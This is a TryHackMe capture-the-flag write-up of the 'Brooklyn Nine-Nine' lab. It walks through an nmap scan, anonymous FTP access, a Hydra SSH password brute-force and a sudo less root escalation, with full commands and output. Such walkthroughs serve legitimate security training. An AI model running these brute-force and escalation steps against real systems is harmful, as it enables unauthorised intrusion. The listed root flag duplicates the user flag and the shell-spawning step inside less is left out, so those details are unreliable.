# 🚔 Brooklyn Nine-Nine - TryHackMe Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Tags:** `FTP` `SSH` `Hydra` `Privilege Escalation` `sudo`

---

## 📌 Overview

This room is aimed for beginner level hackers and the goal is to gain initial access through an open FTP server, brute-force SSH credentials, and then escalate privileges to root using a `sudo` misconfiguration.

---

## 🔍 Step 1 - Host Discovery (Ping Scan)

First, confirm the target machine is alive by sending ICMP packets with `ping`.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ping -c 5 10.49.164.161
PING 10.49.164.161 (10.49.164.161) 56(84) bytes of data.
64 bytes from 10.49.164.161: icmp_seq=1 ttl=62 time=158 ms
64 bytes from 10.49.164.161: icmp_seq=2 ttl=62 time=80.0 ms
64 bytes from 10.49.164.161: icmp_seq=3 ttl=62 time=106 ms
64 bytes from 10.49.164.161: icmp_seq=4 ttl=62 time=123 ms
64 bytes from 10.49.164.161: icmp_seq=5 ttl=62 time=245 ms

--- 10.49.164.161 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4009ms
rtt min/avg/max/mdev = 80.005/142.348/244.852/57.130 ms
```

The machine responds successfully — 5 packets sent, 5 received, **0% packet loss**.


---

## 🗺️ Step 2 - Port & Service Enumeration (Nmap)

Run an aggressive full-port scan with Nmap to discover open services, versions, and OS details.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ nmap -A -p- --min-rate 5000 10.49.164.161
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-14 05:51 EDT
Nmap scan report for 10.49.164.161
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```


## 📂 Step 3 - FTP Anonymous Login & File Retrieval

Log in to the FTP server anonymously and no password needed.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ftp 10.49.164.161
Connected to 10.49.164.161.
220 (vsFTPd 3.0.3)
Name (10.49.164.161:aashiq): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||25750|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
119 bytes received in 00:00 (1.12 KiB/s)
ftp> exit
221 Goodbye.
```

**Note contents:**
> *From Amy: Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine*
---

## 🔓 Step 4 - SSH Brute-Force with Hydra

Using the username `jake` from the note, use hydra brute-force to get his ssh password with  `rockyou.txt` wordlist.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.164.161
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 05:54:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.49.164.161:22/
[22][ssh] host: 10.49.164.161   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 05:54:14
```

---

## 🚪 Step 5 - SSH Login & User Flag

Log in via SSH with the cracked credentials and navigate to find the user and root flag.

```bash
┌──(aashiq㉿kali)-[~/Downloads]
└─$ ssh jake@10.49.164.161
jake@10.49.164.161's password: 
Last login: Thu May 14 09:40:22 2026 from 192.168.185.158
jake@brookly_nine_nine:~$ ls
jake@brookly_nine_nine:~$ pwd
/home/jake
jake@brookly_nine_nine:~$ cd /home
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

**User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## ⚡ Step 6 - Privilege Escalation (sudo less)

```bash
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Jake can run `less` as root **without a password**! This is a classic GTFOBins privilege escalation. Exploit it by spawning a shell from within `less`:

```bash
jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
# whoami
root
# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

**Root shell obtained!** 🎉

---

## 🏆 Flags Summary

| Flag | Value |
|------|-------|
| 🙍 User Flag | `ee11cbb19052e40b07aac0ca060c23ee` |
| 👑 Root Flag | `ee11cbb19052e40b07aac0ca060c23ee`|


*Written by aashiq | TryHackMe Writeups Repository*
